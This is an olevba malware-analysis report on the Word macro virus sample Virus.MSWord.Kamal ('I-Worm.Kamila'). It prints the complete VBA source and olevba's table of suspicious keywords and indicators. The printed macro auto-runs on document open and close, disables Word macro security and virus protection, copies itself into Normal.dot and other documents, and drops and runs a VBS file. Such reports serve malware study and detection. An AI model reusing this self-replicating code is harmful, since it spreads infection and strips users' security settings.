olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kamal-a9d351107e5f554df95d48f396f7b4059beed93e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kamal-a9d351107e5f554df95d48f396f7b4059beed93e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'I-Worm.Kamila

Private Sub Document_Open()
    On Error Resume Next
    If ThisDocument.Type = wdTypeDocument And KamExTemp Then Exit Sub
    If ThisDocument.Type = wdTypeTemplate And KamExDoc Then Exit Sub
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "I-Worm.Kamila"
        .Subject = "I-Worm.Kamila"
        .Comments = "Generated by I-Worm.Kamila"
        .Execute
    End With
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

   With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    ActiveDocument.ReadOnlyRecommended = False
    If KamExDoc And KamExTemp Then Exit Sub

    If KamExDoc Then
        ActiveDocument.VBProject.VBComponents("ThisDocument").Export "C:\kama.dll"
        NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\kama.dll"
        NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 4
    ElseIf KamExTemp Then
        NormalTemplate.VBProject.VBComponents("ThisDocument").Export "C:\kama.dll"
        ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\kama.dll"
        ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines 1, 4
    End If
    Kill "C:\kama.dll"
    ActiveDocument.Save
    NormalTemplate.Save
    DropWorm
End Sub

Private Sub Document_Close()
    Document_Open
End Sub

Private Function KamExDoc() As Boolean
    On Error Resume Next
    str1 = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 1)
    KamExDoc = (str1 = "'I-Worm.Kamila")
End Function

Private Function KamExTemp() As Boolean
    On Error Resume Next
    str1 = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.Lines(1, 1)
    KamExTemp = (str1 = "'I-Worm.Kamila")
End Function

Private Sub DropWorm()
    On Error Resume Next
    Dim blYes As Boolean
    Dim wsh As Object
    blYes = False
    Open "C:\kam_drop.vbs" For Output As #1
    For i = 1 To ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
        str1 = ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(i, 1)
        If str1 = "'<BODY>" Then
            blYes = True
            str1 = ""
        ElseIf str1 = "'</BODY>" Then
            blYes = False
        End If
        If blYes Then
            Print #1, Right(str1, Len(str1) - 1) & vbCrLf
        End If
    Next i
    Set wsh = CreateObject("WScript.Shell")
    Close #1
    wsh.Run "C:\kam_drop.vbs"
    Set wsh = Nothing
End Sub


'<BODY>
'MsgBox "I"
'</BODY>


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |kama.dll            |Executable file name                         |
|IOC       |kam_drop.vbs        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

